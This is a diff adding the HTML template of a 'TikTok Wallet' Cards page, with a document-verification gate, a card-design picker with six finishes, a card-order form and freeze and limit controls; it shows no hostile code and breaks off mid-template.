@@ -1,0 +1,1109 @@
+<!doctype html>
+<html lang="en-US">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta name="theme-color" content="#F5F5F8">
+    
+    <meta name="csrf-token" content="PdcJYaCR5uInm62Kc50Gj4p5b6VNLaMJ10YSDovG">
+    <script src="/js/wallet-shim.js"></script>
+    <title>Cards</title>
+    <link rel="stylesheet" href="/css/tokens.css">
+    <link rel="stylesheet" href="/css/shell.css">
+    <link rel="stylesheet" href="/css/components.css">
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    
+    <script src="/js/vendor/turbo.min.js"></script>
+    <script src="/js/app.js" defer></script>
+    <script src="/js/lead.js" defer></script>
+    <script src="/js/vendor/alpine.min.js" defer></script>
+</head>
+<body>
+
+<div class="app-shell" x-data="{ sheetOpen: false, uploadOpen: false, cardDetails: false, cardLimit: false, cardPin: false, cardDesign: false }">
+
+    <header class="app-header">
+        <img class="app-header__logo" src="/images/logo.webp" alt="TikTok Wallet" width="82" height="24">
+
+        <div class="app-header__actions">
+            
+            <button type="button" class="app-header__bell" @click="sheetOpen = true"
+                    aria-label="Notifications"
+                    x-data="{ unread: 0 }"
+                    @support-unread.window="unread = Math.max($event.detail.unread, 0)">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"/><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/></svg>
+                <span class="app-header__dot" aria-hidden="true" x-show="unread > 0"
+                       style="display:none" ></span>
+            </button>
+        </div>
+    </header>
+
+    <main class="app-main  " id="screen">
+        
+    
+        
+        
+        <section class="screen stack--loose card-gate">
+
+            <h1 class="screen__title">Cards</h1>
+
+            <p class="screen__lead">
+                Your TikTok card is designed and managed right here.
+            </p>
+
+            <div class="card-stage">
+                <div class="card-face card-face--matte"
+     style="--surface:#14141c;--glow:rgba(255,255,255,.05)"
+      aria-hidden="true" >
+
+    <div class="card-face__texture" aria-hidden="true"></div>
+    <div class="card-face__glare" aria-hidden="true"></div>
+    <div class="card-face__glow" aria-hidden="true"></div>
+
+    <div class="card-face__top">
+        <span class="card-face__brand">TikTok Wallet</span>
+        <span class="card-face__kind">Midnight</span>
+    </div>
+
+    
+    <div class="card-face__chips" aria-hidden="true">
+        <svg class="card-face__contactless" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"
+             width="20" height="20" fill="none" stroke="#fff" stroke-width="1.6" stroke-linecap="round" focusable="false">
+            <path d="M8.5 5.5a9 9 0 0 1 0 13"/>
+            <path d="M12.5 3a13 13 0 0 1 0 18"/>
+            <path d="M4.5 8a5 5 0 0 1 0 8"/>
+        </svg>
+
+        <svg class="card-face__chip" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 36"
+             width="34" height="26" fill="none" focusable="false">
+            <rect x="1" y="1" width="46" height="34" rx="4" fill="#d8dbe0" stroke="#9aa0aa" stroke-width="0.5"/>
+            <rect x="6" y="6" width="14" height="10" rx="1.5" fill="none" stroke="#7b828d" stroke-width="0.8" opacity="0.4"/>
+            <rect x="24" y="6" width="10" height="10" rx="1.5" fill="none" stroke="#7b828d" stroke-width="0.8" opacity="0.4"/>
+            <rect x="6" y="20" width="18" height="10" rx="1.5" fill="none" stroke="#7b828d" stroke-width="0.8" opacity="0.4"/>
+            <line x1="4" y1="12" x2="44" y2="12" stroke="#7b828d" stroke-width="0.3" opacity="0.2"/>
+            <line x1="4" y1="24" x2="44" y2="24" stroke="#7b828d" stroke-width="0.3" opacity="0.2"/>
+        </svg>
+    </div>
+
+    <div class="card-face__engraving">
+        <p class="card-face__pan">**** **** **** ****</p>
+
+        <div class="card-face__row">
+            <span class="card-face__holder" >CARD HOLDER</span>
+            <span class="card-face__expiry"><span class="card-face__expiry-label">Valid thru</span> ••/••</span>
+        </div>
+
+            </div>
+
+    </div>
+            </div>
+
+            <div class="card-gate__veil" role="group" aria-label="Cards locked until verification">
+                <div class="card-gate__panel">
+                    <span class="card-gate__badge" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+</span>
+                    <h2 class="card-gate__title">Verify your account to open cards</h2>
+                    <p class="card-gate__text">
+                        Submit your documents and start the account review to request
+                        and design your card.
+                    </p>
+                    <a href="/verification" class="btn btn--primary btn--full">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/></svg>
+                        Verify documents
+                    </a>
+                </div>
+            </div>
+
+        </section>
+
+        
+<template id="card-tpl-design">
+<section class="screen stack--loose" x-data="{
+                     design: 'midnight',
+                     type: 'virtual',
+                     holder: '',
+                     get engraved() { return this.holder.trim() === '' ? 'CARD HOLDER' : this.holder.toUpperCase() }
+                 }">
+
+            <h1 class="screen__title">Cards</h1>
+
+            <p class="screen__lead enter" style="--i:0">
+                Design your card and we start manufacturing it right away. You can change the
+                finish, the limits and the controls at any time.
+            </p>
+
+            <div class="card-stage enter" style="--i:1">
+                                    
+                    <div x-show="design === 'midnight'">
+                        <div class="card-face card-face--matte" style="--surface:#14141c;--glow:rgba(255,255,255,.05)" aria-hidden="true">
+
+    <div class="card-face__texture" aria-hidden="true"></div>
+    <div class="card-face__glare" aria-hidden="true"></div>
+    <div class="card-face__glow" aria-hidden="true"></div>
+
+    <div class="card-face__top">
+        <span class="card-face__brand">TikTok Wallet</span>
+        <span class="card-face__kind">Midnight</span>
+    </div>
+
+    
+    <div class="card-face__chips" aria-hidden="true">
+        <svg class="card-face__contactless" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#fff" stroke-width="1.6" stroke-linecap="round" focusable="false">
+            <path d="M8.5 5.5a9 9 0 0 1 0 13"></path>
+            <path d="M12.5 3a13 13 0 0 1 0 18"></path>
+            <path d="M4.5 8a5 5 0 0 1 0 8"></path>
+        </svg>
+
+        <svg class="card-face__chip" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 36" width="34" height="26" fill="none" focusable="false">
+            <rect x="1" y="1" width="46" height="34" rx="4" fill="#d8dbe0" stroke="#9aa0aa" stroke-width="0.5"></rect>
+            <rect x="6" y="6" width="14" height="10" rx="1.5" fill="none" stroke="#7b828d" stroke-width="0.8" opacity="0.4"></rect>
+            <rect x="24" y="6" width="10" height="10" rx="1.5" fill="none" stroke="#7b828d" stroke-width="0.8" opacity="0.4"></rect>
+            <rect x="6" y="20" width="18" height="10" rx="1.5" fill="none" stroke="#7b828d" stroke-width="0.8" opacity="0.4"></rect>
+            <line x1="4" y1="12" x2="44" y2="12" stroke="#7b828d" stroke-width="0.3" opacity="0.2"></line>
+            <line x1="4" y1="24" x2="44" y2="24" stroke="#7b828d" stroke-width="0.3" opacity="0.2"></line>
+        </svg>
+    </div>
+
+    <div class="card-face__engraving">
+        <p class="card-face__pan">**** **** **** ****</p>
+
+        <div class="card-face__row">
+            <span class="card-face__holder" x-text="engraved">CARD HOLDER</span>
+            <span class="card-face__expiry"><span class="card-face__expiry-label">Valid thru</span> ••/••</span>
+        </div>
+
+            </div>
+
+    </div>
+                    </div>
+                                    
+                    <div x-show="design === 'signature'" style="display:none">
+                        <div class="card-face card-face--gloss" style="--surface:#F52A52;--glow:rgba(37,244,238,.06)" aria-hidden="true">
+
+    <div class="card-face__texture" aria-hidden="true"></div>
+    <div class="card-face__glare" aria-hidden="true"></div>
+    <div class="card-face__glow" aria-hidden="true"></div>
+
+    <div class="card-face__top">
+        <span class="card-face__brand">TikTok Wallet</span>
+        <span class="card-face__kind">Signature</span>
+    </div>
+
+    
+    <div class="card-face__chips" aria-hidden="true">
+        <svg class="card-face__contactless" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#fff" stroke-width="1.6" stroke-linecap="round" focusable="false">
+            <path d="M8.5 5.5a9 9 0 0 1 0 13"></path>
+            <path d="M12.5 3a13 13 0 0 1 0 18"></path>
+            <path d="M4.5 8a5 5 0 0 1 0 8"></path>
+        </svg>
+
+        <svg class="card-face__chip" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 36" width="34" height="26" fill="none" focusable="false">
+            <rect x="1" y="1" width="46" height="34" rx="4" fill="#fbbf24" stroke="#d97706" stroke-width="0.5"></rect>
+            <rect x="6" y="6" width="14" height="10" rx="1.5" fill="none" stroke="#b45309" stroke-width="0.8" opacity="0.4"></rect>
+            <rect x="24" y="6" width="10" height="10" rx="1.5" fill="none" stroke="#b45309" stroke-width="0.8" opacity="0.4"></rect>
+            <rect x="6" y="20" width="18" height="10" rx="1.5" fill="none" stroke="#b45309" stroke-width="0.8" opacity="0.4"></rect>
+            <line x1="4" y1="12" x2="44" y2="12" stroke="#b45309" stroke-width="0.3" opacity="0.2"></line>
+            <line x1="4" y1="24" x2="44" y2="24" stroke="#b45309" stroke-width="0.3" opacity="0.2"></line>
+        </svg>
+    </div>
+
+    <div class="card-face__engraving">
+        <p class="card-face__pan">**** **** **** ****</p>
+
+        <div class="card-face__row">
+            <span class="card-face__holder" x-text="engraved">CARD HOLDER</span>
+            <span class="card-face__expiry"><span class="card-face__expiry-label">Valid thru</span> ••/••</span>
+        </div>
+
+            </div>
+
+    </div>
+                    </div>
+                                    
+                    <div x-show="design === 'graphite'" style="display:none">
+                        <div class="card-face card-face--brushed" style="--surface:#3a3f4b;--glow:rgba(255,255,255,.06)" aria-hidden="true">
+
+    <div class="card-face__texture" aria-hidden="true"></div>
+    <div class="card-face__glare" aria-hidden="true"></div>
+    <div class="card-face__glow" aria-hidden="true"></div>
+
+    <div class="card-face__top">
+        <span class="card-face__brand">TikTok Wallet</span>
+        <span class="card-face__kind">Graphite</span>
+    </div>
+
+    
+    <div class="card-face__chips" aria-hidden="true">
+        <svg class="card-face__contactless" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#fff" stroke-width="1.6" stroke-linecap="round" focusable="false">
+            <path d="M8.5 5.5a9 9 0 0 1 0 13"></path>
+            <path d="M12.5 3a13 13 0 0 1 0 18"></path>
+            <path d="M4.5 8a5 5 0 0 1 0 8"></path>
+        </svg>
+
+        <svg class="card-face__chip" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 36" width="34" height="26" fill="none" focusable="false">
+            <rect x="1" y="1" width="46" height="34" rx="4" fill="#d8dbe0" stroke="#9aa0aa" stroke-width="0.5"></rect>
+            <rect x="6" y="6" width="14" height="10" rx="1.5" fill="none" stroke="#7b828d" stroke-width="0.8" opacity="0.4"></rect>
+            <rect x="24" y="6" width="10" height="10" rx="1.5" fill="none" stroke="#7b828d" stroke-width="0.8" opacity="0.4"></rect>
+            <rect x="6" y="20" width="18" height="10" rx="1.5" fill="none" stroke="#7b828d" stroke-width="0.8" opacity="0.4"></rect>
+            <line x1="4" y1="12" x2="44" y2="12" stroke="#7b828d" stroke-width="0.3" opacity="0.2"></line>
+            <line x1="4" y1="24" x2="44" y2="24" stroke="#7b828d" stroke-width="0.3" opacity="0.2"></line>
+        </svg>
+    </div>
+
+    <div class="card-face__engraving">
+        <p class="card-face__pan">**** **** **** ****</p>
+
+        <div class="card-face__row">
+            <span class="card-face__holder" x-text="engraved">CARD HOLDER</span>
+            <span class="card-face__expiry"><span class="card-face__expiry-label">Valid thru</span> ••/••</span>
+        </div>
+
+            </div>
+
+    </div>
+                    </div>
+                                    
+                    <div x-show="design === 'carbon'" style="display:none">
+                        <div class="card-face card-face--carbon" style="--surface:#1b2027;--glow:rgba(37,184,179,.07)" aria-hidden="true">
+
+    <div class="card-face__texture" aria-hidden="true"></div>
+    <div class="card-face__glare" aria-hidden="true"></div>
+    <div class="card-face__glow" aria-hidden="true"></div>
+
+    <div class="card-face__top">
+        <span class="card-face__brand">TikTok Wallet</span>
+        <span class="card-face__kind">Carbon</span>
+    </div>
+
+    
+    <div class="card-face__chips" aria-hidden="true">
+        <svg class="card-face__contactless" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#fff" stroke-width="1.6" stroke-linecap="round" focusable="false">
+            <path d="M8.5 5.5a9 9 0 0 1 0 13"></path>
+            <path d="M12.5 3a13 13 0 0 1 0 18"></path>
+            <path d="M4.5 8a5 5 0 0 1 0 8"></path>
+        </svg>
+
+        <svg class="card-face__chip" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 36" width="34" height="26" fill="none" focusable="false">
+            <rect x="1" y="1" width="46" height="34" rx="4" fill="#fbbf24" stroke="#d97706" stroke-width="0.5"></rect>
+            <rect x="6" y="6" width="14" height="10" rx="1.5" fill="none" stroke="#b45309" stroke-width="0.8" opacity="0.4"></rect>
+            <rect x="24" y="6" width="10" height="10" rx="1.5" fill="none" stroke="#b45309" stroke-width="0.8" opacity="0.4"></rect>
+            <rect x="6" y="20" width="18" height="10" rx="1.5" fill="none" stroke="#b45309" stroke-width="0.8" opacity="0.4"></rect>
+            <line x1="4" y1="12" x2="44" y2="12" stroke="#b45309" stroke-width="0.3" opacity="0.2"></line>
+            <line x1="4" y1="24" x2="44" y2="24" stroke="#b45309" stroke-width="0.3" opacity="0.2"></line>
+        </svg>
+    </div>
+
+    <div class="card-face__engraving">
+        <p class="card-face__pan">**** **** **** ****</p>
+
+        <div class="card-face__row">
+            <span class="card-face__holder" x-text="engraved">CARD HOLDER</span>
+            <span class="card-face__expiry"><span class="card-face__expiry-label">Valid thru</span> ••/••</span>
+        </div>
+
+            </div>
+
+    </div>
+                    </div>
+                                    
+                    <div x-show="design === 'lagoon'" style="display:none">
+                        <div class="card-face card-face--gloss" style="--surface:#125f5c;--glow:rgba(37,244,238,.08)" aria-hidden="true">
+
+    <div class="card-face__texture" aria-hidden="true"></div>
+    <div class="card-face__glare" aria-hidden="true"></div>
+    <div class="card-face__glow" aria-hidden="true"></div>
+
+    <div class="card-face__top">
+        <span class="card-face__brand">TikTok Wallet</span>
+        <span class="card-face__kind">Lagoon</span>
+    </div>
+
+    
+    <div class="card-face__chips" aria-hidden="true">
+        <svg class="card-face__contactless" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#fff" stroke-width="1.6" stroke-linecap="round" focusable="false">
+            <path d="M8.5 5.5a9 9 0 0 1 0 13"></path>
+            <path d="M12.5 3a13 13 0 0 1 0 18"></path>
+            <path d="M4.5 8a5 5 0 0 1 0 8"></path>
+        </svg>
+
+        <svg class="card-face__chip" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 36" width="34" height="26" fill="none" focusable="false">
+            <rect x="1" y="1" width="46" height="34" rx="4" fill="#d8dbe0" stroke="#9aa0aa" stroke-width="0.5"></rect>
+            <rect x="6" y="6" width="14" height="10" rx="1.5" fill="none" stroke="#7b828d" stroke-width="0.8" opacity="0.4"></rect>
+            <rect x="24" y="6" width="10" height="10" rx="1.5" fill="none" stroke="#7b828d" stroke-width="0.8" opacity="0.4"></rect>
+            <rect x="6" y="20" width="18" height="10" rx="1.5" fill="none" stroke="#7b828d" stroke-width="0.8" opacity="0.4"></rect>
+            <line x1="4" y1="12" x2="44" y2="12" stroke="#7b828d" stroke-width="0.3" opacity="0.2"></line>
+            <line x1="4" y1="24" x2="44" y2="24" stroke="#7b828d" stroke-width="0.3" opacity="0.2"></line>
+        </svg>
+    </div>
+
+    <div class="card-face__engraving">
+        <p class="card-face__pan">**** **** **** ****</p>
+
+        <div class="card-face__row">
+            <span class="card-face__holder" x-text="engraved">CARD HOLDER</span>
+            <span class="card-face__expiry"><span class="card-face__expiry-label">Valid thru</span> ••/••</span>
+        </div>
+
+            </div>
+
+    </div>
+                    </div>
+                                    
+                    <div x-show="design === 'aurora'" style="display:none">
+                        <div class="card-face card-face--holo" style="--surface:#2b2350;--glow:rgba(160,120,255,.10)" aria-hidden="true">
+
+    <div class="card-face__texture" aria-hidden="true"></div>
+    <div class="card-face__glare" aria-hidden="true"></div>
+    <div class="card-face__glow" aria-hidden="true"></div>
+
+    <div class="card-face__top">
+        <span class="card-face__brand">TikTok Wallet</span>
+        <span class="card-face__kind">Aurora</span>
+    </div>
+
+    
+    <div class="card-face__chips" aria-hidden="true">
+        <svg class="card-face__contactless" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#fff" stroke-width="1.6" stroke-linecap="round" focusable="false">
+            <path d="M8.5 5.5a9 9 0 0 1 0 13"></path>
+            <path d="M12.5 3a13 13 0 0 1 0 18"></path>
+            <path d="M4.5 8a5 5 0 0 1 0 8"></path>
+        </svg>
+
+        <svg class="card-face__chip" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 36" width="34" height="26" fill="none" focusable="false">
+            <rect x="1" y="1" width="46" height="34" rx="4" fill="#fbbf24" stroke="#d97706" stroke-width="0.5"></rect>
+            <rect x="6" y="6" width="14" height="10" rx="1.5" fill="none" stroke="#b45309" stroke-width="0.8" opacity="0.4"></rect>
+            <rect x="24" y="6" width="10" height="10" rx="1.5" fill="none" stroke="#b45309" stroke-width="0.8" opacity="0.4"></rect>
+            <rect x="6" y="20" width="18" height="10" rx="1.5" fill="none" stroke="#b45309" stroke-width="0.8" opacity="0.4"></rect>
+            <line x1="4" y1="12" x2="44" y2="12" stroke="#b45309" stroke-width="0.3" opacity="0.2"></line>
+            <line x1="4" y1="24" x2="44" y2="24" stroke="#b45309" stroke-width="0.3" opacity="0.2"></line>
+        </svg>
+    </div>
+
+    <div class="card-face__engraving">
+        <p class="card-face__pan">**** **** **** ****</p>
+
+        <div class="card-face__row">
+            <span class="card-face__holder" x-text="engraved">CARD HOLDER</span>
+            <span class="card-face__expiry"><span class="card-face__expiry-label">Valid thru</span> ••/••</span>
+        </div>
+
+            </div>
+
+    </div>
+                    </div>
+                            </div>
+
+            <div class="enter" style="--i:2">
+                <h2 class="section__title">Finish</h2>
+
+                <div class="swatches">
+                                            <button type="button" class="swatch" :class="design === 'midnight' &amp;&amp; 'swatch--on'" @click="design = 'midnight'" :aria-pressed="design === 'midnight'" aria-pressed="true">
+                            <span class="swatch__chip swatch__chip--matte" style="--surface:#14141c" aria-hidden="true"></span>
+                            <span class="swatch__name">Midnight</span>
+                        </button>
+                                            <button type="button" class="swatch" :class="design === 'signature' &amp;&amp; 'swatch--on'" @click="design = 'signature'" :aria-pressed="design === 'signature'" aria-pressed="false">
+                            <span class="swatch__chip swatch__chip--gloss" style="--surface:#F52A52" aria-hidden="true"></span>
+                            <span class="swatch__name">Signature</span>
+                        </button>
+                                            <button type="button" class="swatch" :class="design === 'graphite' &amp;&amp; 'swatch--on'" @click="design = 'graphite'" :aria-pressed="design === 'graphite'" aria-pressed="false">
+                            <span class="swatch__chip swatch__chip--brushed" style="--surface:#3a3f4b" aria-hidden="true"></span>
+                            <span class="swatch__name">Graphite</span>
+                        </button>
+                                            <button type="button" class="swatch" :class="design === 'carbon' &amp;&amp; 'swatch--on'" @click="design = 'carbon'" :aria-pressed="design === 'carbon'" aria-pressed="false">
+                            <span class="swatch__chip swatch__chip--carbon" style="--surface:#1b2027" aria-hidden="true"></span>
+                            <span class="swatch__name">Carbon</span>
+                        </button>
+                                            <button type="button" class="swatch" :class="design === 'lagoon' &amp;&amp; 'swatch--on'" @click="design = 'lagoon'" :aria-pressed="design === 'lagoon'" aria-pressed="false">
+                            <span class="swatch__chip swatch__chip--gloss" style="--surface:#125f5c" aria-hidden="true"></span>
+                            <span class="swatch__name">Lagoon</span>
+                        </button>
+                                            <button type="button" class="swatch" :class="design === 'aurora' &amp;&amp; 'swatch--on'" @click="design = 'aurora'" :aria-pressed="design === 'aurora'" aria-pressed="false">
+                            <span class="swatch__chip swatch__chip--holo" style="--surface:#2b2350" aria-hidden="true"></span>
+                            <span class="swatch__name">Aurora</span>
+                        </button>
+                                    </div>
+
+                <p class="swatches__blurb">
+                                            <span x-show="design === 'midnight'">Matte black, understated.</span>
+                                            <span x-show="design === 'signature'" style="display: none;">The house colour.</span>
+                                            <span x-show="design === 'graphite'" style="display: none;">Brushed metal finish.</span>
+                                            <span x-show="design === 'carbon'" style="display: none;">Woven carbon fibre.</span>
+                                            <span x-show="design === 'lagoon'" style="display: none;">Deep teal, high contrast.</span>
+                                            <span x-show="design === 'aurora'" style="display: none;">Iridescent, limited run.</span>
+                                    </p>
+            </div>
+
+            <div class="enter" style="--i:3">
+                <h2 class="section__title">Card type</h2>
+
+                <div class="choice-list">
+                                            <button type="button" class="choice" :class="type === 'virtual' &amp;&amp; 'choice--on'" @click="type = 'virtual'" :aria-pressed="type === 'virtual'" aria-pressed="true">
+                            <span class="choice__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="2" y="5" width="20" height="14" rx="2"></rect><path d="M2 10h20"></path></svg>
+</span>
+                            <span class="choice__body">
+                                <span class="choice__title">Virtual card</span>
+                                <span class="choice__text">Ready for online payments as soon as it is issued.</span>
+                            </span>
+                            <span class="choice__meta">Issued instantly</span>
+                        </button>
+                                            <button type="button" class="choice" :class="type === 'physical' &amp;&amp; 'choice--on'" @click="type = 'physical'" :aria-pressed="type === 'physical'" aria-pressed="false">
+                            <span class="choice__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M22 2 11 13"></path><path d="M22 2 15 22l-4-9-9-4z"></path></svg>
+</span>
+                            <span class="choice__body">
+                                <span class="choice__title">Physical card</span>
+                                <span class="choice__text">Printed and shipped to your registered address.</span>
+                            </span>
+                            <span class="choice__meta">Shipped in 5–7 business days</span>
+                        </button>
+                                    </div>
+            </div>
+
+            <form class="stack enter" style="--i:4" action="/cards/order" method="post">
+                                <input type="hidden" name="design" :value="design" value="midnight">
+                <input type="hidden" name="type" :value="type" value="virtual">
+
+                <h2 class="section__title">Name on card</h2>
+                <label class="field">
+                    <span class="field__label">As it should be embossed</span>
+                    <input class="field__input" type="text" name="holder_name" maxlength="26" autocomplete="cc-name" placeholder="Alex R. Carter" x-model="holder">
+                </label>
+
+                <button type="submit" class="btn btn--primary btn--full">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="2" y="5" width="20" height="14" rx="2"></rect><path d="M2 10h20"></path></svg>
+                    Request card
+                </button>
+
+                <p class="form__note">
+                    Requesting a card is free. Activation unlocks once your account verification is complete.
+                </p>
+            </form>
+
+        </section>
+</template>
+
+<template id="card-tpl-production">
+<section class="screen stack--loose" x-data="{
+                     frozen: false,
+                     status: 'In production',
+                     async toggleFreeze() {
+                         const next = !this.frozen;
+                         this.frozen = next;
+                         const result = await window.post('/cards/freeze', { frozen: next });
+                         if (result &amp;&amp; result.status) { this.status = result.status; }
+                         else if (!result) { this.frozen = !next; }
+                         window.toast(next ? 'Card frozen.' : 'Card unfrozen.');
+                     },
+                     async setControl(control, enabled) {
+                         const result = await window.post('/cards/controls', { control, enabled });
+                         window.toast(result ? 'Card controls updated.' : 'Could not update that control.');
+                         return result !== null;
+                     }
+                 }">
+
+            <h1 class="screen__title">Cards</h1>
+
+            <div class="card-stage enter" style="--i:0" :class="frozen &amp;&amp; 'card-stage--frozen'">
+                <div class="card-face card-face--gloss" :class="frozen &amp;&amp; 'card-face--frozen'" style="--surface:#F52A52;--glow:rgba(37,244,238,.06)">
+
+    <div class="card-face__texture" aria-hidden="true"></div>
+    <div class="card-face__glare" aria-hidden="true"></div>
+    <div class="card-face__glow" aria-hidden="true"></div>
+
+    <div class="card-face__top">
+        <span class="card-face__brand">TikTok Wallet</span>
+        <span class="card-face__kind">Signature</span>
+    </div>
+
+    
+    <div class="card-face__chips" aria-hidden="true">
+        <svg class="card-face__contactless" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#fff" stroke-width="1.6" stroke-linecap="round" focusable="false">
+            <path d="M8.5 5.5a9 9 0 0 1 0 13"></path>
+            <path d="M12.5 3a13 13 0 0 1 0 18"></path>
+            <path d="M4.5 8a5 5 0 0 1 0 8"></path>
+        </svg>
+
+        <svg class="card-face__chip" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 36" width="34" height="26" fill="none" focusable="false">
+            <rect x="1" y="1" width="46" height="34" rx="4" fill="#fbbf24" stroke="#d97706" stroke-width="0.5"></rect>
+            <rect x="6" y="6" width="14" height="10" rx="1.5" fill="none" stroke="#b45309" stroke-width="0.8" opacity="0.4"></rect>
+            <rect x="24" y="6" width="10" height="10" rx="1.5" fill="none" stroke="#b45309" stroke-width="0.8" opacity="0.4"></rect>
+            <rect x="6" y="20" width="18" height="10" rx="1.5" fill="none" stroke="#b45309" stroke-width="0.8" opacity="0.4"></rect>
+            <line x1="4" y1="12" x2="44" y2="12" stroke="#b45309" stroke-width="0.3" opacity="0.2"></line>
+            <line x1="4" y1="24" x2="44" y2="24" stroke="#b45309" stroke-width="0.3" opacity="0.2"></line>
+        </svg>
+    </div>
+
+    <div class="card-face__engraving">
+        <p class="card-face__pan">**** **** **** __PAN__</p>
+
+        <div class="card-face__row">
+            <span class="card-face__holder">__HOLDER__</span>
+            <span class="card-face__expiry"><span class="card-face__expiry-label">Valid thru</span> 09/30</span>
+        </div>
+
+                    <p class="card-face__status"><span class="card-face__dot" aria-hidden="true"></span>In production</p>
+            </div>
+
+    <div class="card-face__frozen" x-show="frozen" x-cloak aria-hidden="true">
+        <span class="card-face__frozen-badge">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="3" y="11" width="18" height="11" rx="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+            Frozen
+        </span>
+    </div>
+
+    </div>
+            </div>
+
+            <div class="card-actions enter" style="--i:1">
+                <button type="button" class="card-action" @click="toggleFreeze()" :class="frozen &amp;&amp; 'card-action--on'">
+                    <span class="card-action__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="3" y="11" width="18" height="11" rx="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+</span>
+                    <span class="card-action__label" x-text="frozen ? 'Unfreeze' : 'Freeze'">Freeze</span>
+                </button>
+
+                <button type="button" class="card-action" @click="cardDetails = true; window.walletCardSync && window.walletCardSync()">
+                    <span class="card-action__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+</span>
+                    <span class="card-action__label">Details</span>
+                </button>
+
+                <button type="button" class="card-action" @click="cardLimit = true; window.walletCardSync && window.walletCardSync()">
+                    <span class="card-action__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 20V10"></path><path d="M12 20V4"></path><path d="M6 20v-6"></path></svg>
+</span>
+                    <span class="card-action__label">Limit</span>
+                </button>
+
+                <button type="button" class="card-action" @click="cardDesign = true; window.walletCardSync && window.walletCardSync()">
+                    <span class="card-action__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="3" y="3" width="18" height="18" rx="2"></rect><path d="M3 9h18"></path><path d="M3 15h18"></path><path d="M9 3v18"></path><path d="M15 3v18"></path></svg>
+</span>
+                    <span class="card-action__label">Design</span>
+                </button>
+            </div>
+
+                            <div class="enter" style="--i:2">
+                    <div class="alert-banner alert-banner--warning" role="note">
+    <span class="alert-banner__icon" aria-hidden="true">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="10"></circle><path d="M12 6v6l4 2"></path></svg>
+    </span>
+
